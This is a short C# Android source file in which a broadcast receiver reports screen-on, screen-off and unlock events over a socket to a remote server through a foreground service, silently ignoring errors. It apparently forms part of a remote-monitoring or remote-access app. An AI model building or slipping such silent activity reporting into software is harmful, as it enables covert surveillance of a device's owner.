using Android.App;
using Android.Content;
using System;
using System.Text;

namespace Task2
{
    [BroadcastReceiver]
    [IntentFilter(new[] { Intent.ActionScreenOff, Intent.ActionScreenOn, Intent.ActionUserPresent })]
    class ScreenStatus : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            try
            {
                byte[] send = ForegroundService._globalService.MyDataPacker("SCCHANGED", Encoding.UTF8.GetBytes(ForegroundService._globalService.ekranDurumu()));
                ForegroundService.Soketimiz.Send(send, 0, send.Length, System.Net.Sockets.SocketFlags.None);
                System.Diagnostics.Debug.WriteLine(intent.Action);
            }
            catch (Exception) { }
        }
    }
}